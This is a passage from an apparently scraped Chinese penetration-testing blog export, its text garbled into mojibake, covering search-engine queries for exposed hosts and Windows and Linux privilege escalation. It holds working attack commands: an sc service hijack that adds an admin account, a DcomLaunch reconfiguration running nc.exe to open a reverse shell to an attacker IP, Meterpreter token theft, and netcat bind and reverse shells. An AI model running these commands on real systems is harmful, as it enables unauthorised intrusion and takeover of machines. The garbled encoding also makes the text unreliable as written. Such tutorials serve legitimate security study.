ç»„ä»¶ç‰ˆæœ¬ä¾‹1ï¼šæœç´¢ä½¿ç”¨iis6.0ä¸»æœºï¼šapp:â€Microsoft-IISâ€ verâ€6.0â€ï¼Œå¯ä»¥çœ‹åˆ°0.6ç§’æœç´¢åˆ°41ï¼Œ781,210å·¦å³çš„ä½¿ç”¨iis6.0çš„ä¸»æœºã€‚ ä¾‹2ï¼šæœç´¢ä½¿weblogicä¸»æœºï¼šapp:â€weblogic httpdâ€ port:7001ï¼Œå¯ä»¥çœ‹åˆ°0.078ç§’æœç´¢åˆ°42ä¸‡å·¦å³çš„ä½¿ç”¨weblogicçš„ä¸»æœºã€‚ ä¾‹3ï¼šæŸ¥è¯¢å¼€æ”¾3389ç«¯å£çš„ä¸»æœºï¼šport:3389 ä¾‹4ï¼šæŸ¥è¯¢æ“ä½œç³»ç»Ÿä¸ºLinuxç³»ç»Ÿçš„æœåŠ¡å™¨ï¼Œos:linux ä¾‹5ï¼šæŸ¥è¯¢å…¬ç½‘æ‘„åƒå¤´ï¼šservice:â€routersetupâ€ ä¾‹6ï¼šæœç´¢ç¾å›½çš„ Apache æœåŠ¡å™¨ï¼šapp:Apache country:US åé¢è¿˜å¯ä»¥æ¥city: åŸå¸‚åç§° ä¾‹7ï¼šæœç´¢æŒ‡å®šipä¿¡æ¯ï¼Œip:121.42.173.26 ä¾‹8ï¼šæŸ¥è¯¢æœ‰å…³taobao.comåŸŸåçš„ä¿¡æ¯ï¼Œsite:taobao.com ä¾‹9ï¼šæœç´¢æ ‡é¢˜ä¸­åŒ…å«è¯¥å­—ç¬¦çš„ç½‘ç«™ï¼Œtitle:weblogic ä¾‹10ï¼škeywords:Nginx 1.13 æ‰©å±•: fofa hackdomain=â€â€||ip=â€â€||host=â€â€||title=â€â€||header=â€â€protocol=â€httpsâ€ï¼Œæœç´¢æŒ‡å®šåè®®ç±»å‹ app=â€phpinfoâ€æœç´¢æŸäº›ç»„ä»¶ç›¸å…³ç³»ç»Ÿ host=â€oldboyedu.com/â€œæœç´¢åŒ…å«æœ‰ç‰¹å®šå­—ç¬¦çš„URL title=â€powered byâ€ &amp;&amp; os==windowsæœç´¢ç½‘é¡µæ ‡é¢˜ä¸­åŒ…å«æœ‰ç‰¹å®šå­—ç¬¦å¹¶ä¸”ç³»ç»Ÿæ˜¯windowsçš„ç½‘é¡µ è¯¦ç»†è¯·çœ‹å®˜æ–¹è¯¦ç»†æ–‡æ¡£; https://fofa.so/help https://github.com/Threezh1/JSFinder","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://zhangyanlady.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"keywords":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"ææƒ","slug":"ææƒ","date":"2019-09-19T12:15:53.000Z","updated":"2020-09-20T08:58:18.900Z","comments":true,"path":"2019/09/19/ææƒ/","link":"","permalink":"https://zhangyanlady.github.io/2019/09/19/%E6%8F%90%E6%9D%83/","excerpt":"","text":"æ€»ç»“å›¾ windowä¸€ã€å¸¸è§ææƒæ–¹æ³•1ã€æº¢å‡ºæ¼æ´ææƒ 2ã€æ•°æ®åº“ææƒ 3ã€ç¬¬ä¸‰æ–¹è½¯ä»¶ææƒ äºŒã€Cmdå‘½ä»¤æ— æ³•æ‰§è¡ŒåŸå› åˆ†æ1ã€Cmdå‘½ä»¤æ— æ³•æ‰§è¡Œåˆ†æä¸»è¦åŸå› æ˜¯cmd.exeè¢«ç®¡ç†å‘˜é™æƒæˆ–åˆ é™¤ï¼Œä¹Ÿæœ‰å¯èƒ½ç»„ä»¶è¢«åˆ é™¤ã€‚ 2ã€Cmdå‘½ä»¤æ‰§è¡Œè§£å†³æ–¹æ³•é€šè¿‡è„šæœ¬æœ¨é©¬æŸ¥æ‰¾å¯è¯»å¯å†™ç›®å½•ï¼Œä¸Šä¼ cmdï¼Œè°ƒç”¨cmdè·¯å¾„æ‰§è¡Œå‘½ä»¤ï¼ˆæ‰¾å¯è¯»å¯å†™ç›®å½•ä¸è¦é€‰å¸¦ç©ºæ ¼ç›®å½•ï¼‰ã€‚ setp c:\\è·¯å¾„â€¦\\cmd.exe #åˆ‡æ¢è‡³ä¸Šä¼ çš„cmdæ¥æ‰§è¡Œå‘½ä»¤ ä¸‰ã€ææƒå¸¸ç”¨å‘½ä»¤è®²è§£12345678whoami â€”â€”æŸ¥çœ‹ç”¨æˆ·æƒé™systeminfo â€”â€”æŸ¥çœ‹æ“ä½œç³»ç»Ÿï¼Œè¡¥ä¸æƒ…å†µipconfigâ€”â€”æŸ¥çœ‹å½“å‰æœåŠ¡å™¨IPipconfig&#x2F;allnet userâ€”â€”æŸ¥çœ‹å½“å‰ç”¨æˆ·æƒ…å†µnetstat â€”â€”æŸ¥çœ‹å½“å‰ç½‘ç»œè¿æ¥æƒ…å†µ netstat â€“ano&#x2F;netstat â€“an|findâ€œESTABLISHEDâ€tasklist â€”â€”æŸ¥çœ‹å½“å‰è¿›ç¨‹æƒ…å†µ tasklist&#x2F;svctaskkill â€”â€”ç»“æŸè¿›ç¨‹ taskkill-PIDxxnet start â€”â€”å¯åŠ¨æœåŠ¡net stop â€”â€”åœæ­¢æœåŠ¡ âšªå¾®è½¯å®˜æ–¹æ—¶åˆ»å…³æ³¨åˆ—è¡¨ç½‘å€:https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/securitybulletins2017 æ¯”å¦‚å¸¸ç”¨çš„å‡ ä¸ªå·²å…¬å¸ƒçš„ expï¼šKB2592799KB3000061KB2592799 ğŸ”´å¿«é€ŸæŸ¥æ‰¾æœªæ‰“è¡¥ä¸çš„ expï¼Œå¯ä»¥æœ€å®‰å…¨çš„å‡å°‘ç›®æ ‡æœºçš„æœªçŸ¥é”™è¯¯ï¼Œä»¥å…å½±å“ä¸šåŠ¡ã€‚ å‘½ä»¤è¡Œä¸‹æ‰§è¡Œæ£€æµ‹æœªæ‰“è¡¥ä¸çš„å‘½ä»¤å¦‚ä¸‹ï¼š 1systeminfo&gt;micropoor.txt&amp;(for%iin(KB977165 KB2160329 KB2503665 KB2592799 KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904 KB3134228 KB3143141 KB3141780)do@typemicropoor.txt|@find&#x2F;i&quot;%i&quot;||@echo%i you can fuck)&amp;del&#x2F;f&#x2F;q&#x2F;a micropoor.txt â›”ä¸€èˆ¬å®æˆ˜ä¸­åœ¨ç±»ä¼¼ tmp ç›®å½•ç­‰å¯å†™ç›®å½•ä¸‹æ‰§è¡Œï¼šå¦‚ C:\\tmp&gt; âš«ç›®å‰å·²å¯¹å¤–å…¬å¼€expæ³¨ï¼š https://github.com/SecWiki/windows-kernel-exploits https://github.com/WindowsExploits/Exploits https://github.com/AusJock/Privilege-Escalation å››ã€æº¢å‡ºæ¼æ´ææƒå®æˆ˜æµ‹è¯•UACä»‹ç»UACï¼ˆUser Account Controlï¼‰æ˜¯å¾®è½¯åœ¨ Windows Vista ä»¥åç‰ˆæœ¬å¼•å…¥çš„ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œé€šè¿‡ UACï¼Œåº”ç”¨ç¨‹åºå’Œä»»åŠ¡å¯å§‹ç»ˆåœ¨éç®¡ç†å‘˜å¸æˆ·çš„å®‰å…¨ä¸Šä¸‹æ–‡ä¸­è¿è¡Œï¼Œé™¤éç®¡ç†å‘˜ç‰¹åˆ«æˆäºˆç®¡ç†å‘˜çº§åˆ«çš„ç³»ç»Ÿè®¿é—®æƒé™ã€‚å½“å‰è·å¾—çš„æƒé™æ˜¯å­˜åœ¨äºç®¡ç†å‘˜ç»„çš„æ—¶å€™ä½†æ˜¯å¹¶ä¸”æ˜¯administratorè¿™ä¸ªç”¨æˆ·ï¼Œæ­¤æ—¶å°±å¯èƒ½éœ€è¦æˆ‘ä»¬è¿›è¡Œç»•è¿‡UACçš„æ“ä½œï¼Œå¦åˆ™è™½ç„¶æ˜¯ç®¡ç†å‘˜ç»„ä½†æ˜¯å®é™…ä¸Šå¹¶æ²¡æœ‰ç®¡ç†å‘˜æ‰€å¯¹åº”çš„é«˜æƒé™æ“ä½œ,è¿™ä¸ªæ—¶å€™å°±éœ€è¦bypass uac windows 7ã€8ã€08ã€12ã€16sc å‘½ä»¤ææƒï¼ˆadministratorâ€“&gt;systemï¼‰ psï¼šç»æµ‹è¯•03ä¹Ÿå¯ä»¥ã€‚ å…³äºscå‘½ä»¤ï¼š SC æ˜¯ç”¨äºä¸æœåŠ¡æ§åˆ¶ç®¡ç†å™¨å’ŒæœåŠ¡è¿›è¡Œé€šä¿¡çš„å‘½ä»¤è¡Œç¨‹åºã€‚æä¾›çš„åŠŸèƒ½ç±»ä¼¼äºâ€œæ§åˆ¶é¢æ¿â€ä¸­â€œç®¡ç†å·¥å…·â€é¡¹ä¸­çš„â€œæœåŠ¡â€ã€‚ 1sc Create syscmd binPath&#x3D; â€œcmd &#x2F;K startâ€ type&#x3D; own type&#x3D; interact è¿™ä¸ªå‘½ä»¤çš„æ„æ€æ˜¯åˆ›å»ºä¸€ä¸ªåå«syscmdçš„æ–°çš„äº¤äº’å¼çš„cmdæœåŠ¡ç„¶åæ‰§è¡Œsc start systcmdï¼Œå°±å¾—åˆ°äº†ä¸€ä¸ªsystemæƒé™çš„cmdç¯å¢ƒ ä¸å¸¦å¼•å·çš„æœåŠ¡è·¯å¾„ Windowså‘½ä»¤è§£é‡Šç¨‹åºå¯èƒ½ä¼šé‡åˆ°åç§°ä¸­çš„ç©ºæ ¼ï¼Œå¹¶ä¸”æ²¡æœ‰åŒ…è£…åœ¨å¼•å·ä¸­çš„æ—¶å€™ã€‚å°±æœ‰å¯èƒ½å‡ºç°è§£ææ¼æ´ï¼Œå¦‚ä¸‹è¿°è·¯å¾„ï¼ŒC:\\Program Files\\Vulnerable.exeä¸­å­˜åœ¨ç©ºæ ¼ï¼Œæ­¤æ—¶åœ¨Cç›˜æ ¹ç›®å½•ä¸Šä¼ Program.exeæ–‡ä»¶æ—¶ï¼Œå°±ä¼šè¢«ç›®æ ‡å¼€æœºè‡ªå¯åŠ¨ã€‚å¦‚æœæ— æ•ˆï¼Œè¿˜å¯ä»¥å°è¯•åœ¨C:\\Program Filesè·¯å¾„ä¸‹ä¸Šä¼ Vulnerable.exeæ–‡ä»¶ã€‚ 1234C:\\Program.exeC:\\Program Files\\Vulnerable.exeC:\\Program Files\\Vulnerable Service\\Sub.exeC:\\Program Files\\Vulnerable Service\\Sub Directory\\service.exe æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹é”™è¯¯é…ç½®çš„è·¯å¾„ 1wmic service get name,displayname,pathname,startmode |findstr &#x2F;i &quot;Auto&quot; |findstr &#x2F;i &#x2F;v &quot;C:\\Windows\\\\&quot; |findstr &#x2F;i &#x2F;v &quot;&quot;&quot; 4.4ã€åˆ©ç”¨ä¸å®‰å…¨çš„æœåŠ¡æƒé™å³ä½¿æ­£ç¡®å¼•ç”¨äº†æœåŠ¡è·¯å¾„ï¼Œä¹Ÿå¯èƒ½å­˜åœ¨å…¶ä»–æ¼æ´ã€‚ç”±äºç®¡ç†é…ç½®é”™è¯¯ï¼Œç”¨æˆ·å¯èƒ½å¯¹æœåŠ¡æ‹¥æœ‰è¿‡å¤šçš„æƒé™ï¼Œä¾‹å¦‚ï¼Œå¯ä»¥ç›´æ¥ä¿®æ”¹å®ƒã€‚AccessChkå·¥å…·å¯ä»¥ç”¨æ¥æŸ¥æ‰¾ç”¨æˆ·å¯ä»¥ä¿®æ”¹çš„æœåŠ¡ï¼š 12accesschk.exe -uwcqv â€œAuthenticated Usersâ€ * &#x2F;accepteulaaccesschk.exe -uwcqv â€œuserâ€ * scå‘½ä»¤ä¹Ÿå¯ä»¥ç”¨æ¥æŸ¥æ‰¾ç”¨æˆ·å¯ä»¥ä¿®æ”¹çš„æœåŠ¡ï¼š 1sc qc â€œServiceâ€ #æŸ¥æ‰¾å¯ä»¥ä¿®æ”¹çš„æœåŠ¡ 123sc config PFNET binpath&#x3D; â€œnet user rottenadmin P@ssword123! &#x2F;addâ€sc stop PFNETsc start PFNET æ¯å½“æˆ‘ä»¬å¼€å¯æœåŠ¡æ—¶scå‘½ä»¤éƒ½è¿”å›äº†ä¸€ä¸ªé”™è¯¯ã€‚è¿™æ˜¯å› ä¸ºnet userå‘½ä»¤æ²¡æœ‰æŒ‡å‘äºŒè¿›åˆ¶æœåŠ¡ï¼Œå› æ­¤SCMæ— æ³• ä¸æœåŠ¡è¿›è¡Œé€šä¿¡ï¼Œé€šè¿‡ä½¿ç”¨æ‰§è¡Œè‡ªåŠ¨è¿ç§»åˆ°æ–°è¿›ç¨‹çš„payloadï¼Œæ‰‹åŠ¨è¿ç§»è¿›ç¨‹ï¼Œæˆ–è€…åœ¨æ‰§è¡Œåå°†æœåŠ¡çš„binè·¯å¾„è®¾ç½®å›åŸå§‹æœåŠ¡äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚æˆ–è€…æˆ‘ä»¬åœ¨æƒé™å…è®¸çš„æƒ…å†µä¸‹ï¼Œå°†æˆ‘ä»¬çš„æœ¨é©¬æ”¾åˆ°æœåŠ¡ç›®å½•ä¸‹ï¼Œå¹¶é‡å‘½åä¸ºæœåŠ¡å¯åŠ¨çš„åº”ç”¨åç§°ã€‚ç”µè„‘é‡å¯æ—¶å³å¯è·å¾—ä¸€ä¸ªsystemçš„shell å®Œæ•´æ¡ˆä¾‹ï¼šâ‘ ã€åˆ©ç”¨ç³»ç»Ÿè‡ªå¸¦çš„ DcomLaunchæœåŠ¡æµ‹è¯•(æ­¤æœåŠ¡Power Userç»„ä½æƒå¯æ“ä½œ) 1â€œsc qc DcomLaunchâ€å‘½ä»¤æŸ¥è¯¢DcomLaunchçš„è¯¦ç»†ä¿¡æ¯ 1net start | find &quot;DCOM Server Process Launcher&quot; æŸ¥çœ‹æœåŠ¡æ˜¯å¦å¯åŠ¨ è¿è¡Œ tasklist /svc æ‰¾åˆ°å¯¹åº”æœåŠ¡ â‘¡ã€ä¿®æ”¹æœåŠ¡å¹¶è·å–ç³»ç»Ÿæƒé™ è¿™é‡Œè¦é…ç½®ä½¿ç”¨ncåå¼¹shellåˆ°æˆ‘çš„æ”»å‡»æœºä¸Šï¼ŒæŠŠncæ”¾åˆ°c:\\windows\\tempç›®å½•ä¸‹ï¼Œä½¿ç”¨scå¯¹æœåŠ¡è¿›è¡Œä¿®æ”¹ 1sc config DcomLaunch binpath&#x3D; &quot;C:\\wmpub\\nc.exe -nv 192.168.32.194 4433 -e C:\\WINDOWS\\system32\\cmd.exe&quot; â›”æ³¨æ„binpath=åé¢ä¸€å®šè¦æœ‰ä¸ªç©ºæ ¼ï¼ŒIPä¸ºæ”»å‡»è€…IP â‘¢ã€æŸ¥çœ‹æ˜¯å¦ç¬¬äºŒæ­¥æˆåŠŸ 1sc qc DcomLaunch â‘£ã€é…ç½®è´¦å·å¯†ç  1sc config DcomLaunch obj&#x3D; &quot;.\\LocalSystem&quot; password&#x3D; &quot;&quot; obj:æŒ‡å®šè¿è¡ŒæœåŠ¡å°†ä½¿ç”¨çš„å¸æˆ·åï¼Œæˆ–æŒ‡å®šè¿è¡Œé©±åŠ¨ç¨‹åºå°†ä½¿ç”¨çš„ Windows é©±åŠ¨ç¨‹åºå¯¹è±¡åã€‚é»˜è®¤è®¾ç½®ä¸º LocalSystemã€‚password:æŒ‡å®šä¸€ä¸ªå¯†ç ã€‚å¦‚æœä½¿ç”¨äº†é LocalSystem çš„å¸æˆ·ï¼Œåˆ™æ­¤é¡¹æ˜¯å¿…éœ€çš„ã€‚ â‘¤ã€é‡å¯æœåŠ¡ 1net start DcomLaunch â‘¥ã€æ”»å‡»æœºä¸Šç”¨ncè¿›è¡Œç›‘å¬4433å³å¯å¾—åˆ°åå¼¹çš„shell 1nc.exe -vv -l -p 4433 4.5ã€è®¡åˆ’ä»»åŠ¡å¦‚æœæ”»å‡»è€…å¯¹ä»¥é«˜æƒé™è¿è¡Œçš„ä»»åŠ¡æ‰€åœ¨çš„ç›®å½•å…·æœ‰å†™æƒé™ï¼Œå°±å¯ä»¥ä½¿ç”¨æ¶æ„ç¨‹åºè¦†ç›–åŸæ¥çš„ç¨‹åºï¼Œè¿™æ ·åœ¨ä¸‹æ¬¡è®¡åˆ’æ‰§è¡Œæ—¶ï¼Œå°±ä¼šä»¥é«˜æƒé™æ¥è¿è¡Œæ¶æ„ç¨‹åºã€‚ 12schtasks &#x2F;query &#x2F;fo LIST &#x2F;v #æŸ¥çœ‹è®¡ç®—æœºçš„è®¡åˆ’ä»»åŠ¡accesschk.exe -dqv &quot;D:\\test&quot; -accepteula #æŸ¥çœ‹æŒ‡å®šç›®å½•çš„æƒé™é…ç½®æƒ…å†µ 4.6ã€MeterpreteråŸºç¡€ææƒé¦–å…ˆåœ¨Meterpreterä¼šè¯æ‰§è¡Œpså‘½ä»¤æŸ¥çœ‹ç›®æ ‡æœºå½“å‰è¿›ç¨‹ï¼šå‡è®¾æ­¤å¤„çœ‹åˆ°äº†ä¸€ä¸ªè¿›ç¨‹ï¼Œè¿è¡Œè´¦æˆ·æ˜¯åŸŸç®¡ç†å‘˜ï¼Œæˆ‘ä»¬å¯ä»¥å†ç¬¬ä¸€æ æ‰¾åˆ°å¯¹åº”çš„è¿›ç¨‹PIDï¼Œï¼ˆå®é™…æˆ‘ä»¬è¿™é‡Œæ‰¾ä¸ªä»»æ„çš„SYSTEMè´¦æˆ·è¿è¡Œçš„è¿›ç¨‹ï¼‰ï¼ŒPIDä¸º2584ï¼šç„¶åæˆ‘ä»¬å¯ä»¥æ‰§è¡Œä»¥ä¸‹è¯­å¥çªƒå–è¯¥ç”¨æˆ·è¿›ç¨‹çš„ä»¤ç‰Œï¼šlinux 1steal_token 2584 äº”ã€æº¢å‡ºæ¼æ´å®‰å…¨é˜²èŒƒ ğŸŸ£åŠæ—¶é€šè¿‡Windows Updateæˆ–ç¬¬ä¸‰æ–¹å·¥å…·360æ›´æ–°è¡¥ä¸åœ¨doså‘½ä»¤çª—å£è¾“å…¥systeminfo å‘½ä»¤å›è½¦ï¼Œæ˜¾ç¤ºæ‰€æœ‰ç³»ç»Ÿè¡¥ä¸ç›¸å…³ä¿¡æ¯ linuxå½“æˆ‘ä»¬æ‹¿åˆ°äº†ä¸€å°LinuxæœåŠ¡å™¨çš„ä½æƒé™è´¦å·ï¼Œäºæ˜¯ï¼Œæˆ‘ä»¬æƒ³è¦é€šè¿‡æŠ€æœ¯æ‰‹æ®µææƒè‡³ root ç”¨æˆ·æƒé™ï¼Œä»¥æ‰§è¡Œæ›´å¤šçš„æ“ä½œã€‚é¦–å…ˆå…³äºLinuxææƒæˆ‘ä»¬å¾—å…ˆæ˜ç™½å‡ ä¸ªæ¦‚å¿µã€‚ å£¹ï¼šlinuxå‘è¡Œç‰ˆæœ¬ æ˜¯æˆ‘ä»¬å¸¸è¯´çš„Linuxæ“ä½œç³»ç»Ÿï¼Œä¹Ÿå³æ˜¯ç”±Linuxå†…æ ¸ä¸å„ç§å¸¸ç”¨è½¯ä»¶çš„é›†åˆäº§å“ï¼Œå…¨çƒå¤§çº¦æœ‰æ•°ç™¾æ¬¾çš„Linuxç³»ç»Ÿç‰ˆæœ¬ï¼Œæ¯ä¸ªç³»ç»Ÿç‰ˆæœ¬éƒ½æœ‰è‡ªå·±çš„ç‰¹æ€§å’Œç›®æ ‡äººç¾¤ï¼Œ ä¾‹å¦‚ï¼š 1234CentOS ç¤¾åŒºä¼ä¸šç‰ˆï¼ˆæœåŠ¡å™¨ç«¯ï¼‰redhat ç¤¾åŒºä¸ªäººç‰ˆubuntu ï¼ˆä¸ªäººç«¯ï¼‰kali ï¼ˆhackedï¼‰ è´°ï¼šlinuxå†…æ ¸ Linuxç³»ç»Ÿå†…æ ¸æŒ‡çš„æ˜¯ä¸€ä¸ªç”±Linus Torvaldsè´Ÿè´£ç»´æŠ¤ï¼Œæä¾›ç¡¬ä»¶æŠ½è±¡å±‚ã€ç¡¬ç›˜åŠæ–‡ä»¶ç³»ç»Ÿæ§åˆ¶åŠå¤šä»»åŠ¡åŠŸèƒ½çš„ç³»ç»Ÿæ ¸å¿ƒç¨‹åºã€‚Linuxå†…æ ¸ç‰ˆæœ¬æœ‰ä¸¤ç§ï¼šç¨³å®šç‰ˆå’Œå¼€å‘ç‰ˆ ï¼ŒLinuxå†…æ ¸ç‰ˆæœ¬å·ç”±3ç»„æ•°å­—ç»„æˆï¼šç¬¬ä¸€ä¸ªç»„æ•°å­—.ç¬¬äºŒç»„æ•°å­—.ç¬¬ä¸‰ç»„æ•°å­— ç¬¬ä¸€ä¸ªç»„æ•°å­—ï¼šç›®å‰å‘å¸ƒçš„å†…æ ¸ä¸»ç‰ˆæœ¬ã€‚ç¬¬äºŒä¸ªç»„æ•°å­—ï¼šå¶æ•°è¡¨ç¤ºç¨³å®šç‰ˆæœ¬ï¼›å¥‡æ•°è¡¨ç¤ºå¼€å‘ä¸­ç‰ˆæœ¬ã€‚ç¬¬ä¸‰ä¸ªç»„æ•°å­—ï¼šé”™è¯¯ä¿®è¡¥çš„æ¬¡æ•°ã€‚ ä½¿ç”¨ uname -r å¯ä»¥çœ‹åˆ°linuxç³»ç»Ÿçš„å‘è¡Œç‰ˆæœ¬å·ã€‚3.10.0å°±æ˜¯å†…æ ¸ç‰ˆæœ¬å·ã€‚3å°±æ˜¯å†…æ ¸ä¸»ç‰ˆæœ¬ï¼Œ10è¡¨ç¤ºæ˜¯ç¨³å®šç‰ˆï¼Œ0è¡¨ç¤ºé”™è¯¯ä¿®è¡¥æ¬¡æ•°æ˜¯0ã€‚ è€Œ 123.el7.x86_64åˆ™æ˜¯ redhat çš„å‘è¡Œç‰ˆæœ¬ä¿¡æ¯ï¼Œ123 ä»£è¡¨ç¼–è¯‘123æ¬¡ï¼Œel7ä»£è¡¨çš„æ˜¯redhat7ï¼Œx86_64åˆ™æ˜¯64ä½ç³»ç»Ÿã€‚ 12345æˆ–è€…ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ä¹Ÿå¯ä»¥çœ‹åˆ°ç³»ç»Ÿå†…æ ¸åŠç‰ˆæœ¬çš„ä¸€äº›ä¿¡æ¯ï¼šuname -a #æŸ¥çœ‹å†…æ ¸çš„å…·ä½“ä¿¡æ¯cat &#x2F;proc&#x2F;version #æŸ¥çœ‹å†…æ ¸çš„å…·ä½“ä¿¡æ¯cat &#x2F;etc&#x2F;centos-release #æŸ¥çœ‹centoså‘è¡Œç‰ˆæœ¬cat &#x2F;etc&#x2F;redhat-release #æŸ¥çœ‹redhatå‘è¡Œç‰ˆæœ¬ åï¼šLinuxå¼€å¯apacheæœåŠ¡ åœ¨ç»ˆç«¯è¾“å…¥ 1â€œvim &#x2F;etc&#x2F;apache2&#x2F;ports.confâ€ -&gt; é”®ç›˜è¾“å…¥i è¿›å…¥æ’å…¥ç¼–è¾‘æ¨¡å¼ -&gt; ä¿®æ”¹apache2é»˜è®¤ç›‘å¬ç«¯å£å·ä¸º8080 -&gt; ç¼–è¾‘å¥½åï¼ŒæŒ‰Escé”®+â€œï¼šwqâ€ ä¿å­˜é€€å‡º -&gt; åœ¨ç»ˆç«¯è¾“å…¥ 1â€œ&#x2F;etc&#x2F;init.d&#x2F;apache2 startâ€ è‚†ï¼šLinuxææƒçš„å‰æï¼š æ‹¿åˆ°äº†ä¸€ä¸ªä½æƒé™çš„è´¦å·èƒ½ä¸Šä¼ å’Œä¸‹è½½æ–‡ä»¶æœºå™¨ä¸Šæœ‰pythonã€javaã€perlç­‰ç¯å¢ƒï¼ˆéå¿…é¡»é¡¹ï¼‰ ä¼ï¼šLinuxå¸¸ç”¨æ¸—é€å‘½ä»¤å­¦ä¹  æ­»è®°ç¡¬èƒŒä»¥ä¸‹12ç±»å‘½ä»¤ï¼šç³»ç»Ÿä¿¡æ¯æŸ¥çœ‹ç±»ã€æ–‡ä»¶ç›®å½•ç±»ã€é©±åŠ¨æŒ‚è½½ç±»ã€ç¨‹åºå®‰è£…ç±»ã€æºä»£ç åŒ…å®‰è£…ã€å‹ç¼©è§£å‹ç±»ã€è¿›ç¨‹æ§åˆ¶ç±»ã€ç¨‹åºè¿è¡Œç±»ã€ç”¨æˆ·å¸å·ç±»ã€viç¼–è¾‘ç±»ã€ç½‘ç»œæœåŠ¡ã€å…¶ä»–ç±»ç­‰ã€‚ è¯¦æƒ…å‚è€ƒï¼šLinuxå¸¸ç”¨æ¸—é€å‘½ä»¤ç¯‡ é™†ï¼šLinuxææƒæ–¹æ³•æ€»ç»“ä¸€ã€Linuxåå¼¹ææƒå¦‚æœæ‰‹é‡Œåªæœ‰webshellå¯ä»¥åˆ©ç”¨åå¼¹shellæ¥å¾—åˆ°ä¸€ä¸ªshell 1ã€é¦–å…ˆå¾—æœ‰ä¸€ä¸ªnetcatğŸŸ©ç®€å•ä»‹ç»ä¸€ä¸‹netcat åŠŸèƒ½å¼ºå¤§çš„ç½‘ç»œå·¥å…·ï¼Œåœ¨ç½‘ç»œå·¥å…·ä¸­æœ‰â€œç‘å£«å†›åˆ€â€ç¾èª‰ï¼Œå…¶æœ‰Windowså’ŒLinuxçš„ç‰ˆæœ¬ã€‚å› ä¸ºå®ƒçŸ­å°ç²¾æ‚,åŠŸèƒ½å®ç”¨ï¼Œè¢«è®¾è®¡ä¸ºä¸€ä¸ªç®€å•ã€å¯é çš„ç½‘ç»œå·¥å…·ï¼Œå¯é€šè¿‡TCPæˆ–UDPåè®®ä¼ è¾“è¯»å†™æ•°æ®ã€‚åŒæ—¶ï¼Œå®ƒè¿˜æ˜¯ä¸€ä¸ªç½‘ç»œåº”ç”¨Debugåˆ†æå™¨ï¼Œå› ä¸ºå®ƒå¯ä»¥æ ¹æ®éœ€è¦åˆ›å»ºå„ç§ä¸åŒç±»å‹çš„ç½‘ç»œè¿æ¥ã€‚è¯¦æƒ…å‚è€ƒï¼šhttps://www.cnblogs.com/nmap/p/6148306.html â‘ netcatå‚æ•°ä»‹ç» 12345671) -l ç”¨äºæŒ‡å®šncå°†å¤„äºä¾¦å¬æ¨¡å¼ã€‚æŒ‡å®šè¯¥å‚æ•°ï¼Œåˆ™æ„å‘³ç€ncè¢«å½“ä½œserverï¼Œä¾¦å¬å¹¶æ¥å—è¿æ¥ï¼Œè€Œéå‘å…¶å®ƒåœ°å€å‘èµ·è¿æ¥ã€‚2) -p &lt;port&gt; æš‚æœªç”¨åˆ°ï¼ˆè€ç‰ˆæœ¬çš„ncå¯èƒ½éœ€è¦åœ¨ç«¯å£å·å‰åŠ -på‚æ•°ï¼Œä¸‹é¢æµ‹è¯•ç¯å¢ƒæ˜¯centos6.6ï¼Œncç‰ˆæœ¬æ˜¯nc-1.84ï¼Œæœªç”¨åˆ°-på‚æ•°ï¼‰3) -s æŒ‡å®šå‘é€æ•°æ®çš„æºIPåœ°å€ï¼Œé€‚ç”¨äºå¤šç½‘å¡æœº4) -u æŒ‡å®šncä½¿ç”¨UDPåè®®ï¼Œé»˜è®¤ä¸ºTCP5) -v è¾“å‡ºäº¤äº’æˆ–å‡ºé”™ä¿¡æ¯ï¼Œæ–°æ‰‹è°ƒè¯•æ—¶å°¤ä¸ºæœ‰ç”¨6ï¼‰-w è¶…æ—¶ç§’æ•°ï¼Œåé¢è·Ÿæ•°å­—7ï¼‰-z è¡¨ç¤ºzeroï¼Œè¡¨ç¤ºæ‰«ææ—¶ä¸å‘é€ä»»ä½•æ•°æ® â‘¡ncç”¨æ³•ä»‹ç» 1â€”â€”tcpç›‘å¬ 1nc nc -l -p 8080 å¼€å¯æœ¬åœ°8080ç«¯å£ç›‘å¬ â‘¢ncç”¨æ³•ä»‹ç» 2â€”â€”åå¼¹æœåŠ¡å™¨shell æ–¹æ³•â‘´ï¼šREMOTEä¸»æœºç»‘å®šSHELL 123456åœ¨å…¬ç½‘ç›‘å¬nc -l -p 5354 -t -e c:\\winnt\\system32\\cmd.exeæˆ–è€…nc -l -p 5555 -t -e cmd.exeåœ¨å†…ç½‘ä¸»åŠ¨å»ºç«‹è¿æ¥nc -nvv 192.168.153.138 5555 è®²è§£ï¼š-tæ˜¯é€šè¿‡telneæ¨¡å¼æ‰§è¡Œ cmd.exe ç¨‹åºï¼Œå¯ä»¥çœç•¥ã€‚ç»‘å®šREMOTEä¸»æœºçš„CMDSHELLåœ¨REMOTEä¸»æœºçš„TCP5354ç«¯å£ æ–¹æ³•â‘µï¼šREMOTEä¸»æœºç»‘å®šSHELLå¹¶åå‘è¿æ¥ 123456åœ¨å…¬ç½‘ç›‘å¬nc -lp 5555åœ¨å†…ç½‘æœºå™¨åå¼¹nc -t -e c:\\winnt\\system32\\cmd.exe 192.168.x.x 5354æˆ–è€…nc -t -e cmd 192.168.153.140 5555 